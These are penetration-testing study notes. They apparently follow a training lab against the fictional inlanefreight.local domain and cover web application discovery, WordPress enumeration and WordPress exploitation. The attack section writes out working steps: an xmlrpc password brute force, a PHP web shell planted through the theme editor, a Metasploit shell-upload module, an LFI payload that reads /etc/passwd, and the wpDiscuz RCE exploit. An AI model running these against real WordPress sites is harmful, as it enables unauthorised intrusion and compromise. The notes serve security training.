
# 📘 Application Discovery & Enumeration

## 📍 Purpose
- Maintain an **asset inventory** of all devices, software, and applications.
- Detect rogue or shadow IT, outdated applications, weak/default credentials, and unpatched vulnerabilities.
- Improve visibility and defensive posture.
- Help clients find gaps **before attackers do**.

## 🧭 Methodology Overview

### 🔍 Initial Steps
1. Start with **black box discovery** or provided scope.
2. Perform **ping sweep** to identify live hosts.
3. Run **targeted Nmap scan** for common web ports:

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
````

4. Use tools like **EyeWitness** or **Aquatone** for web screenshotting.

## 📂 Example Scope List

```
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
...
10.129.201.50
```

## 🛠 Tools & Usage

### 🧾 EyeWitness

#### ✅ Install

```bash
sudo apt install eyewitness
```

#### ✅ Run Against Nmap Output

```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

#### 📌 Features

* Takes screenshots using Selenium.
* Supports XML input (Nmap, Nessus).
* Fingerprints apps and suggests default creds.

### 🧾 Aquatone

#### ✅ Download

```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
```

#### ✅ Run with Nmap XML

```bash
cat web_discovery.xml | ./aquatone -nmap
```

#### 📌 Features

* Screenshots and organizes web hosts.
* Categorizes results: High Value, CMS, Forbidden, Splash, etc.
* Fast and lightweight.

## 📝 Notetaking Template

### Notebook Structure Example (OneNote / Notion / Cherrytree / etc.)

```
External Penetration Test - <Client Name>
│
├── Scope
│   ├── CIDR/IPs
│   ├── URLs
│   ├── Fragile Hosts
│   └── Timeframes & Limitations
│
├── Client POCs
├── Credentials
├── Discovery / Enumeration
│   ├── Live Hosts
│   └── Scans (Nmap, Masscan, Nessus, etc.)
│
├── Application Discovery
│   ├── EyeWitness / Aquatone Reports
│   ├── Interesting Hosts
│   └── Potential Vulnerabilities
│
├── Exploitation
│   ├── <Hostname/IP>
│   └── ...
│
└── Post-Exploitation
    ├── <Hostname/IP>
    └── ...
```

### 📌 Enumeration Notes

* Timestamp and log all scans with syntax and target details.
* Highlight interesting subdomains (e.g., `dev`, `qa`, `acc`, `-dev`, `-test`).
* Track software versions, login portals, and Vhosts.
* Mark High-Value Targets (e.g., GitLab, Jenkins, Splunk, Tomcat, CMS).


### 🚨 Tips for Assessments

* **Don’t rely solely on scanners** – manual validation is essential.
* Always **explore built-in functionality** (e.g., file uploads, API endpoints).
* Dev/staging servers often have **lax security controls**.
* Review the **entire screenshot report**, even buried entries may be valuable.
* Avoid rabbit holes early in enumeration; **stay high-level** until discovery is complete.


---

# 🕵️‍♂️ WordPress - Discovery & Enumeration Notes

## 🌐 Target Overview

* **Target URL:** `http://blog.inlanefreight.local`
* **CMS:** WordPress
* **WordPress Version:** 5.8 (vulnerable)

## 🧰 Manual Discovery Summary

### 🔍 Initial Indicators of WordPress

* Accessible files:

  * `/robots.txt` (contains `/wp-admin`, `/wp-content`)
  * `/wp-login.php` (login page)
  * `/xmlrpc.php` (XML-RPC enabled)
* HTML metadata reveals WordPress version:

  ```html
  <meta name="generator" content="WordPress 5.8" />
  ```

### 🎨 Themes
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
* **Theme:** `Transport Gravity` (Child of Business Gravity)
* **Version:** 1.0.1
* **Directory Listing:** Enabled
* **Style URI:** [transport-gravity/style.css](http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css)

### 🔌 Plugins Identified

```
curl -s http://blog.inlanefreight.local/ | grep plugins
```
| Plugin Name    | Version | Vulnerabilities                               |
| -------------- | ------- | --------------------------------------------- |
| Contact Form 7 | 5.4.2   | Not confirmed vulnerable in scan              |
| Mail Masta     | 1.0.0   | ✅ LFI, ✅ SQL Injection                        |
| wpDiscuz       | 7.0.4   | ✅ Unauthenticated Remote Code Execution (RCE) |

> ✅ Plugin directories [](http://blog.inlanefreight.local/wp-content/plugins) have directory listing enabled and `readme.txt` files exposed.

### 👤 User Enumeration

try various logins at /wp-login.php

* **Valid Users Discovered:**

  * `admin`
  * `john`

* **Username Enumeration:** Supported via login error message differences:

  * Valid username → "Incorrect password"
  * Invalid username → "Username not registered"


## ⚙️ WPScan Automated Findings

### 🔧 Scan Command Used:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>
```

### 🔍 Key Findings:

* **WordPress Version:** 5.8
* **XML-RPC:** Enabled (`/xmlrpc.php`)
* **Upload Directory:** Listing enabled (`/wp-content/uploads/`)
* **Theme:** `Transport Gravity`, version 1.0.1
* **Plugin Vulnerabilities:**

  * Mail Masta 1.0:

    * ✅ LFI
    * ✅ SQLi
* **Users Enumerated:**

  * `admin`
  * `john`

## 🧠 Analysis & Next Steps

### 🛠 Vulnerabilities of Interest

* **wpDiscuz 7.0.4**: 🔥 *Unauthenticated RCE*
* **Mail Masta 1.0**:

  * 🐚 *Local File Inclusion*
  * 🐞 *SQL Injection*

### 🛡 Other Opportunities

* Exploit user enumeration via brute-force (XML-RPC or login page)
* Directory listings may expose sensitive files
* Consider fingerprinting theme/plugins not found in WPScan manually

---

# 🛠️ Attacking WordPress

## 🎯 Objective

Gain initial access to a WordPress-based web server by abusing weak credentials, misconfigurations, and known vulnerabilities in plugins/themes.


## 🔍 Step 1: Enumerate Users and Plugins

Tools like **WPScan** are used to enumerate:

* WordPress **version**
* Installed **plugins** & **themes**
* **Users**

Example WPScan command for enumeration:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u,ap,vt
```

## 🚪 Step 2: Brute Force Login Credentials

### 📌 Method: `xmlrpc` (preferred for speed)

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

✅ Success:

```
Username: john
Password: firebird1
```


## 🧬 Step 3: Code Execution via Theme Editor

### 🖥️ Login to WordPress Admin Panel:

URL: `http://blog.inlanefreight.local/wp-login.php`

### 🛠️ Modify an Inactive Theme (e.g., `Twenty Nineteen`)

Navigate:

```
Appearance > Theme Editor > Select Theme > 404.php
```

### 💻 Inject a PHP web shell:

```php
<?php system($_GET[0]); ?>
```

### 🧪 Test Shell Access:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```


## ⚙️ Step 4: Automated Shell Upload via Metasploit

### 🧰 Use `wp_admin_shell_upload` module:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 10.129.42.195
set vhost blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
exploit
```

💥 Opens Meterpreter session as `www-data`.


## 🧨 Step 5: Exploiting Vulnerable Plugins

### 🧵 mail-masta (Unauthenticated LFI)

Vulnerable code:

```php
include($_GET['pl']); // No sanitization!
```

Exploit:

```bash
curl "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### 🪓 wpDiscuz 7.0.4 (Unauthenticated RCE)

* Vulnerability: **File upload bypass** via image upload feature
* CVE: **CVE-2020-24186**

Exploit script:

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Upload Result:

```bash
http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id
```

## 🧹 Post-Exploitation & Clean-up

🧾 Add the following to your report:

* **Exploited systems** (IP/hostname + vector)
* **Compromised users** (username, creds, access level)
* **Artifacts** (web shells, payloads, logs)
* **Modifications** (user creation, privilege changes)

📌 Clean up:

* Remove uploaded shells (e.g., `.php` files in uploads or plugin dirs)
* Remove added users or changes made during testing

---


